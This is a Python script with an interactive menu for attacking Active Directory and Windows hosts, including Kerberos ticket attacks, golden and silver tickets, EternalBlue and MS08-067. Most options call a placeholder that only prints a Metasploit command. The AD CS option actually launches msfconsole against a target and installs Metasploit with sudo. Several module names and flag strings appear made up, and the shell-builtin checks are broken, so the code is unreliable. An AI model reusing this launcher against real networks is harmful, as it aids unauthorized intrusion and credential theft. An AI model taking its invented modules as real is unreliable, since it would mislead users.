import subprocess

# Function to display Active Directory Exploitable options
def active_directory_exploitable():
    print("Active Directory Exploitable Section")
    print("1. Kerberos Ticket Attack")
    print("2. Pass-the-Ticket Attack")
    print("3. Overpass-the-Hash Attack")
    print("4. Golden Ticket Attack")
    print("5. Silver Ticket Attack")
    print("6. AD CS Attack")
    print("7. MS17-010 EternalBlue Attack")
    print("8. MS08-067 NetAPI Attack")
    print("9. MS06-040 NetAPI Attack")
    print("10. MS03-026 DCOM Attack")
    print("11. MS15-051 Microsoft Windows Security Feature Bypass")
    print("12. MS14-068 Microsoft Kerberos Checksum Validation Vulnerability")
    print("13. MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution")
    print("14. MS16-098 Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow")
    print("0. Return to Main Menu")

# Function to perform Active Directory exploitation
def perform_active_directory_exploitation(target):
    while True:
        active_directory_exploitable()
        ad_choice = input("Enter your choice (0-14): ")

        if ad_choice == '0':
            break
        elif ad_choice in map(str, range(1, 15)):
            ad_username = input("Enter target username: ")
            if not ad_username:
                print("Error: Username cannot be empty.")
                continue

            ad_password = input("Enter target password: ")
            print()  # Move to a new line after password input

            if ad_choice == '1':
                print("Performing Kerberos Ticket Attack with Brute Force, Dictionary Attack, and Token Extraction...")
                metasploit_attack("auxiliary/gather/kerberos_ticket_extractor", target, ad_username, ad_password, '-b -d /path/to/dictionary.txt -t')
            elif ad_choice == '2':
                print("Performing Pass-the-Ticket Attack with Brute Force, Credential Harvesting, and Remote Shell...")
                metasploit_attack("exploit/windows/smb/pass_the_ticket", target, ad_username, ad_password, '-b -c -r')
            elif ad_choice == '3':
                print("Performing Overpass-the-Hash Attack with Brute Force, Rainbow Table Attack, and Privilege Escalation...")
                metasploit_attack("exploit/windows/smb/psexec", target, ad_username, ad_password, '-b -r /path/to/rainbow_table.txt -e')
            elif ad_choice == '4':
                print("Performing Golden Ticket Attack with Brute Force, Domain Persistence, and Lateral Movement...")
                metasploit_attack("exploit/windows/smb/psexec", target, ad_username, ad_password, '-b -p -l')
            elif ad_choice == '5':
                print("Performing Silver Ticket Attack with Brute Force, Token Impersonation, and Data Exfiltration...")
                metasploit_attack("exploit/windows/smb/psexec", target, ad_username, ad_password, '-b -i -d /path/to/exfiltration_folder')
            elif ad_choice == '6':
                execute_ad_cs_attack(target)
            elif ad_choice == '7':
                metasploit_attack("exploit/windows/smb/ms17_010_eternalblue", target, ad_username, ad_password, '')
            elif ad_choice == '8':
                metasploit_attack("exploit/windows/smb/ms08_067_netapi", target, ad_username, ad_password, '')
            elif ad_choice == '9':
                metasploit_attack("exploit/windows/smb/ms06_040_netapi", target, ad_username, ad_password, '')
            elif ad_choice == '10':
                metasploit_attack("exploit/windows/smb/ms03_026_dcom", target, ad_username, ad_password, '')
            elif ad_choice == '11':
                metasploit_attack("exploit/windows/local/ms15_051_client_copy_image", target, ad_username, ad_password, '')
            elif ad_choice == '12':
                metasploit_attack("exploit/windows/local/ms14_068_kerberos_checksum", target, ad_username, ad_password, '')
            elif ad_choice == '13':
                metasploit_attack("exploit/windows/smb/ms17_010_psexec", target, ad_username, ad_password, '')
            elif ad_choice == '14':
                metasploit_attack("exploit/windows/local/ms16_098_s2_32", target, ad_username, ad_password, '')
        else:
            print("Invalid choice. Please try again.")

# Function to perform AD CS Attack
def execute_ad_cs_attack(target):
    print("Advanced AD CS Attack Configuration")
    threads = input("Enter the number of threads (default is 10): ")
    threads = threads if threads else '10'  # Use default value if the user presses Enter

    print("Performing AD CS Attack...")
    if subprocess.run(['command', '-v', 'msfconsole']).returncode == 0:
        subprocess.run(['msfconsole', '-x', f"use auxiliary/scanner/http/ca_ldap; set RHOSTS {target}; set THREADS {threads}; run; use auxiliary/scanner/http/ca_ldap_enum; set RHOSTS {target}; run"])
        print("AD CS Attack completed.")
    else:
        install_msf_and_run_attack(target)

# Function to install Metasploit Framework and run AD CS Attack
def install_msf_and_run_attack(target):
    print("Error: 'msfconsole' command not found. Installing Metasploit Framework...")

    package_manager = None
    if subprocess.run(['command', '-v', 'apt-get']).returncode == 0:
        package_manager = "apt-get"
    elif subprocess.run(['command', '-v', 'yum']).returncode == 0:
        package_manager = "yum"
    elif subprocess.run(['command', '-v', 'pacman']).returncode == 0:
        package_manager = "pacman"

    if package_manager:
        subprocess.run(['sudo', package_manager, 'update'])
        subprocess.run(['sudo', package_manager, 'install', 'metasploit-framework', '-y'])

        if subprocess.run(['command', '-v', 'msfconsole']).returncode == 0:
            print("Metasploit Framework installed successfully. Running AD CS Attack...")
            subprocess.run(['msfconsole', '-x', f"use auxiliary/scanner/http/ca_ldap; set RHOSTS {target}; set THREADS 10; run; use auxiliary/scanner/http/ca_ldap_enum; set RHOSTS {target}; run"])
            print("AD CS Attack completed.")
        else:
            print("Error: Metasploit Framework installation failed. Please install it manually.")
    else:
        print("Error: Package manager not found. Please install Metasploit Framework manually.")
        exit(1)

# Dummy function to simulate metasploit_attack
def metasploit_attack(exploit, target, username, password, options):
    print(f"Simulating Metasploit attack: {exploit} {target} {username} {password} {options}")

# Perform an interactive menu
while True:
    perform_active_directory_exploitation("example_target")  # Replace "example_target" with your actual target IP
